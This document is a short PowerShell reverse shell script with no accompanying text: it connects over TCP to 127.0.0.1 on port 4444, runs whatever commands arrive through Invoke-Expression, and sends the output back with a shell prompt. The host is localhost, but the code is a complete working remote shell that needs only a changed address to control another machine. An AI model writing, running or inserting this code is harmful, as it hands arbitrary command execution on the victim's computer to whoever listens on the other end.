$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $sendback = try { Invoke-Expression $data 2>&1 | Out-String } catch { $_.Exception.Message }
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$client.Close()
